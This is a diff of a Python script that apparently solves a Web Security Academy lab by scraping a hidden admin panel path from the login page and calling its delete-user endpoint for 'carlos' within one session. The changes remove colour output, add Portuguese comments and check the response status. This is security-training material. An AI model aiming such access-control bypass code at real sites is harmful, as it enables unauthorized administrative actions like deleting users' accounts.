@@ -10,37 +10,43 @@
 #################################################################
 import requests
 import re
-from colorama import Fore
 
 # Change this to your lab URL
-LAB_URL = "https://0ae2009504d3b3e68124897b00d30051.web-security-academy.net"
+LAB_URL = "https://0a1b00fe04f7a26b82504ea800ad00c8.web-security-academy.net"
 
 def main():
-    print(Fore.WHITE + "⦗1⦘ Fetching the login page.. ", end="", flush=True)
+    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)
     
+    # o path do painel (/admin-xxxxx) e sorteado por sessao anonima,
+    # entao a pagina e o painel precisam ser acessados no mesmo cookie jar
     login_page = fetch("/login")
         
-    print(Fore.GREEN + "OK")
-    print(Fore.WHITE + "⦗2⦘ Extracting the admin panel path from the source code.. ", end="", flush=True)
+    print("OK")
+    print("⦗2⦘ Extracting the admin panel path from the source code.. ", end="", flush=True)
 
     admin_panel_path = re.findall("'(/admin-.*)'", login_page.text)[0]
 
-    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_panel_path)
-    print(Fore.WHITE + "⦗3⦘ Deleting carlos from the admin panel.. ", end="", flush=True)
+    print("OK" + " => " + admin_panel_path)
+    print("⦗3⦘ Deleting carlos from the admin panel.. ", end="", flush=True)
 
-    session = login_page.cookies.get("session")
-    cookies = { "session": session }
-    fetch(f"{admin_panel_path}/delete?username=carlos", cookies=cookies)
+    response = fetch(f"{admin_panel_path}/delete?username=carlos")
    
-    print(Fore.GREEN + "OK")
-    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
+    if response.status_code == 302:
+        print("OK")
+        print("🗹 The lab should be marked now as " + "solved")
+    else:
+        print(f"⦗!⦘ Failed with status {response.status_code}")
 
 
-def fetch(path, cookies = None):
+# a sessao e criada uma vez e reutilizada em todas as requisicoes
+session = requests.Session()
+
+
+def fetch(path):
     try:  
-        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
+        return session.get(f"{LAB_URL}{path}", allow_redirects=False)
     except:
-        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
+        print("⦗!⦘ Failed to fetch " + path + " through exception")
         exit(1)
  
         
